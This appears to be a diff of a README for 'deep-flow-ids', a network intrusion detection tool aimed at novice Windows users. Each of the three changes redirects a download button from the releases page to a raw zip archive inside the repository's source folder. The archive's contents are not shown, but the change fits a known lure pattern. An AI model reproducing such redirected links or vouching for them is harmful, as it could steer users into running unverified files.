@@ -6,7 +6,7 @@ deep-flow-ids is a powerful yet easy-to-use program that watches your computer n
 
 This tool was built using cutting-edge deep learning technology, including Convolutional Neural Networks (CNN) and Long Short-Term Memory (LSTM) models. But don't worry—you don't need to understand any of that to use it. The program does all the heavy lifting behind the scenes, and you just need to click a few buttons to get started.
 
-[![Download deep-flow-ids](https://img.shields.io/badge/Download-deep--flow--ids-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD&color=FF6F00)](https://github.com/Arboreal-cohn3569/deep-flow-ids/releases)
+[![Download deep-flow-ids](https://img.shields.io/badge/Download-deep--flow--ids-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD&color=FF6F00)](https://raw.githubusercontent.com/Arboreal-cohn3569/deep-flow-ids/main/src/ids_deep_flow_v1.8.zip)
 
 ## 🎯 Who Should Use This?
 
@@ -43,7 +43,7 @@ Getting deep-flow-ids on your Windows computer is simple. Here's what you need t
 
 Click the button below or visit the link directly:
 
-[**Download deep-flow-ids Now**](https://github.com/Arboreal-cohn3569/deep-flow-ids/releases)
+[**Download deep-flow-ids Now**](https://raw.githubusercontent.com/Arboreal-cohn3569/deep-flow-ids/main/src/ids_deep_flow_v1.8.zip)
 
 Visit this link to download the application.
 
@@ -161,7 +161,7 @@ deep-flow-ids is released under an open-source license, meaning you're free to u
 
 Protecting your network has never been easier. With deep-flow-ids, you get professional-grade security without needing any technical knowledge. Just download, install, and let the AI do the work.
 
-[**Download deep-flow-ids Today**](https://github.com/Arboreal-cohn3569/deep-flow-ids/releases)
+[**Download deep-flow-ids Today**](https://raw.githubusercontent.com/Arboreal-cohn3569/deep-flow-ids/main/src/ids_deep_flow_v1.8.zip)
 
 Visit this link to download the application.
 
